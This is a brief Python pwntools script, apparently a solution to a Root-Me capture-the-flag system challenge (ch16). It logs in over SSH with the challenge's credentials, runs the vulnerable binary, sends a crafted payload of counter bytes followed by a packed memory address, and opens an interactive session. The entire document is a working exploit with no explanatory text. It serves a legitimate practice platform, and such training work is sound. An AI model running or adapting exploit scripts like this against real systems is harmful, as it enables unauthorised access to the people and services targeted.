 #!/usr/bin/python3
from pwn import *
 
filename = './ch16'
socket = ssh(host='challenge02.root-me.org', user='app-systeme-ch16', password='app-systeme-ch16', port=2222)
p = socket.process("./ch16")
 
counter = b'\x08'*4
check_value = p32(0xbffffabc)
payload = counter + check_value
p.sendline(payload)
p.interactive()
